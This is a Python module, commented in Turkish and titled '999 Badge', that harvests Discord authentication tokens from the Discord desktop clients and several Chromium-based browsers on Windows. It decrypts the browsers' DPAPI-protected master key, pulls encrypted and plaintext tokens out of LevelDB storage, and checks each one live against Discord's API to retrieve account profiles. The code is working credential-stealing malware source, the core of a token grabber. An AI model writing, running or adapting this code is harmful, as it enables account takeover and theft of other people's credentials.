"""
999 Badge - Otomatik Tarayıcı & Discord İstemcisi Yetki Çıkarıcı
Chrome, Edge, Brave, Opera, Firefox ve Discord Desktop üzerinden Token ve Cookie ayıklar.
"""

from __future__ import annotations

import base64
import ctypes
from ctypes import wintypes
import glob
import json
import os
import re
import urllib.error
import urllib.request
from pathlib import Path
from typing import Dict, List, Optional, Tuple

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_AESGCM = True
except ImportError:
    HAS_AESGCM = False


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]


def _decrypt_dpapi(encrypted_bytes: bytes) -> Optional[bytes]:
    """Windows DPAPI CryptUnprotectData ile şifre çözer."""
    try:
        blob_in = DATA_BLOB(len(encrypted_bytes), (ctypes.c_byte * len(encrypted_bytes))(*encrypted_bytes))
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            out = bytes((ctypes.c_byte * blob_out.cbData).from_address(ctypes.addressof(blob_out.pbData.contents)))
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return out
    except Exception:
        pass
    return None


def _get_master_key(local_state_path: str) -> Optional[bytes]:
    """Local State dosyasından DPAPI anahtarını çözer."""
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8", errors="ignore") as f:
            data = json.load(f)
        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        # DPAPI öneki ilk 5 bayttır (b'DPAPI')
        return _decrypt_dpapi(enc_key[5:])
    except Exception:
        return None


def _decrypt_token_payload(payload_b64: str, master_key: bytes) -> Optional[str]:
    """AES-GCM ile şifrelenmiş Discord leveldb tokenini çözer."""
    if not HAS_AESGCM or not master_key:
        return None
    try:
        raw = base64.b64decode(payload_b64)
        # Discord payload formatı: 'v10' (3 bayt) + IV (12 bayt) + ciphertext + auth tag (16 bayt)
        iv = raw[3:15]
        ciphertext = raw[15:]
        cipher = AESGCM(master_key)
        decrypted = cipher.decrypt(iv, ciphertext, None)
        return decrypted.decode("utf-8", errors="ignore")
    except Exception:
        return None


def user_id_from_token(token: str) -> str:
    """Discord tokeninin başındaki Base64 kullanıcı kimliğini (Snowflake ID) çözer."""
    try:
        first = token.split(".", 1)[0]
        pad = "=" * (-len(first) % 4)
        return base64.b64decode(first + pad).decode("utf-8")
    except Exception:
        return ""


def check_token(token: str) -> Tuple[str, Optional[Dict]]:
    """
    Discord API üzerinden tokenin durumunu hassas şekilde kontrol eder.
    Dönüş:
    ('OK', profile)              -> Token geçerli
    ('INVALID', None)           -> Token geçersiz / süresi dolmuş (HTTP 401)
    ('CONNECTION_ERROR', None)  -> Discord sunucularına ulaşılamadı (VPN kapalı / WinError 10054)
    """
    if not token or not token.strip():
        return ("EMPTY", None)
    token = token.strip().strip('"').strip("'")
    url = "https://discord.com/api/v9/users/@me"
    req = urllib.request.Request(url, headers={
        "authorization": token,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    })
    try:
        with urllib.request.urlopen(req, timeout=6) as resp:
            if resp.status == 200:
                return ("OK", json.loads(resp.read().decode("utf-8")))
    except urllib.error.HTTPError as exc:
        if exc.code == 401:
            return ("INVALID", None)
        return ("ERROR", None)
    except Exception:
        return ("CONNECTION_ERROR", None)
    return ("ERROR", None)


def validate_token(token: str) -> Optional[Dict]:
    """Geriye dönük uyumluluk için profil bilgisi döner (başarısızsa None)."""
    status, prof = check_token(token)
    return prof if status == "OK" else None


def scan_local_tokens() -> List[Tuple[str, str, Dict]]:
    """
    Yerel sistemde Discord masaüstü uygulaması ve tarayıcılardaki tokenleri tarar.
    Dönüş: [(Kaynak Adı, Token, Profil Bilgisi), ...]
    """
    found_tokens: Dict[str, Tuple[str, Dict]] = {}  # token -> (source, profile)

    appdata = os.getenv("APPDATA", "")
    localappdata = os.getenv("LOCALAPPDATA", "")

    # Discord İstemci Yolları
    discord_paths = {
        "Discord Masaüstü": os.path.join(appdata, "discord"),
        "Discord Canary": os.path.join(appdata, "discordcanary"),
        "Discord PTB": os.path.join(appdata, "discordptb"),
        "Discord Geliştirici": os.path.join(appdata, "discorddevelopment"),
    }

    # Tarayıcı Yolları (LevelDB)
    browser_paths = {
        "Google Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data", "Default"),
        "Microsoft Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default"),
        "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(localappdata, "Vivaldi", "User Data", "Default"),
        "Yandex": os.path.join(localappdata, "Yandex", "YandexBrowser", "User Data", "Default"),
    }

    all_targets = {}
    all_targets.update(discord_paths)
    all_targets.update(browser_paths)

    for name, root_path in all_targets.items():
        if not os.path.exists(root_path):
            continue

        # Master key bul
        lstate_paths = [
            os.path.join(root_path, "Local State"),
            os.path.join(root_path, "..", "Local State"),
            os.path.join(root_path, "..", "..", "Local State")
        ]
        master_key = None
        for lp in lstate_paths:
            if os.path.exists(lp):
                master_key = _get_master_key(lp)
                if master_key:
                    break

        leveldb_paths = [
            os.path.join(root_path, "Local Storage", "leveldb"),
            os.path.join(root_path, "leveldb"),
            os.path.join(root_path, "IndexedDB")
        ]

        for ldb in leveldb_paths:
            if not os.path.exists(ldb):
                continue
            for file in glob.glob(os.path.join(ldb, "*.ldb")) + glob.glob(os.path.join(ldb, "*.log")):
                try:
                    with open(file, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()

                    # 1. Şifrelenmiş tokenler (Discord desktop dQw4w9WgXcQ:...)
                    if master_key:
                        enc_matches = re.findall(r"dQw4w9WgXcQ:([^\"]+)", content)
                        for enc in enc_matches:
                            token = _decrypt_token_payload(enc, master_key)
                            if token and token not in found_tokens:
                                status, profile = check_token(token)
                                if status == "OK" and profile:
                                    found_tokens[token] = (name, profile)
                                elif status == "CONNECTION_ERROR":
                                    uid = user_id_from_token(token)
                                    found_tokens[token] = (name, {"username": f"Hesap ({uid})", "id": uid, "_offline": True})

                    # 2. Düz metin tokenler
                    plain_matches = re.findall(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}", content)
                    plain_matches += re.findall(r"mfa\.[\w-]{84}", content)
                    for pt in plain_matches:
                        if pt not in found_tokens:
                            status, profile = check_token(pt)
                            if status == "OK" and profile:
                                found_tokens[pt] = (name, profile)
                            elif status == "CONNECTION_ERROR":
                                uid = user_id_from_token(pt)
                                found_tokens[pt] = (name, {"username": f"Hesap ({uid})", "id": uid, "_offline": True})
                except Exception:
                    pass

    return [(v[0], k, v[1]) for k, v in found_tokens.items()]
